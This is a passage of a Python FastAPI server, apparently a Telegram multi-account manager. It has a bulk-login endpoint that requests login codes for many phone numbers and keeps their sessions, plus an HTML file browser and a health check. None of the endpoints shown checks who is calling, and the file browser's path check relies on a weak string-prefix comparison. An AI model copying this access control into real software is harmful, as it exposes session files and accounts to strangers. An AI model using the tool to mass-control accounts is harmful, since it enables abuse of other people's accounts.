    raise HTTPException(404, "No session found")


@app.post("/bulk_login")
async def api_bulk_login(req: BulkLoginReq):
    results = {"sent": [], "already": [], "failed": {}}
    for phone in req.phones:
        try:
            if phone in auth_bot.sessions:
                results["already"].append(phone)
                continue
            client = auth_bot.create_user_client(phone)
            await client.connect()
            if await client.is_user_authorized():
                auth_bot.sessions[phone] = client
                results["already"].append(phone)
                continue
            sent = await client.send_code_request(phone)
            auth_bot.pending_codes[phone] = {"client": client, "phone_code_hash": sent.phone_code_hash, "timeout": sent.timeout}
            results["sent"].append(phone)
            await asyncio.sleep(3)
        except Exception as e:
            results["failed"][phone] = str(e)
    return results


# === File Browser ===
def _dir_listing(directory: Path, url_path: str) -> HTMLResponse:
    entries = sorted(directory.iterdir(), key=lambda p: (p.is_file(), p.name.lower()))
    rows = ""
    if url_path.strip("/"):
        parent = "/" + "/".join(url_path.strip("/").split("/")[:-1])
        rows += f'<tr><td><a href="/files{parent}">.. (up)</a></td><td></td></tr>'
    for entry in entries:
        entry_url = f"/files/{url_path.strip('/')}/{entry.name}".replace("//", "/")
        size = f"{entry.stat().st_size:,} B" if entry.is_file() else "—"
        icon = "📄" if entry.is_file() else "📁"
        rows += f'<tr><td><a href="{entry_url}">{icon} {entry.name}</a></td><td>{size}</td></tr>'
    html = f"""<!DOCTYPE html>
<html><head><title>/{url_path}</title>
<style>body{{font-family:monospace;padding:20px}}table{{border-collapse:collapse;width:100%}}
td{{padding:6px 12px;border-bottom:1px solid #eee}}a{{text-decoration:none;color:#0066cc}}a:hover{{text-decoration:underline}}</style>
</head><body>
<h2>/{url_path}</h2><hr>
<table><tr><th align=left>Name</th><th align=left>Size</th></tr>{rows}</table>
</body></html>"""
    return HTMLResponse(html)


@app.get("/files", response_class=HTMLResponse)
@app.get("/files/{file_path:path}")
async def browse(file_path: str = ""):
    target = (BASE_DIR / file_path).resolve()
    if not str(target).startswith(str(BASE_DIR)):
        raise HTTPException(403, "Access denied")
    if not target.exists():
        raise HTTPException(404, "Not found")
    if target.is_dir():
        return _dir_listing(target, file_path)
    return FileResponse(target, filename=target.name)


# === Health check endpoint (replaces separate HTTP health server) ===
@app.get("/health")
async def health():
    return {"status": "ok"}




if __name__ == '__main__':
    print("======================================================================")
    print("🌐 Enterprise Master Control Router Engine Booted with Interactive Login Hooks.")
    print("======================================================================")
    
    # Force ProactorEventLoop policy explicitly under Windows platforms to handle WebRTC sockets cleanly
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        
    try:
        loop = asyncio.get_event_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
    try:
        loop.run_until_complete(main_lifecycle_bootstrap())
    except KeyboardInterrupt:
        logger.info("System integration down manually.")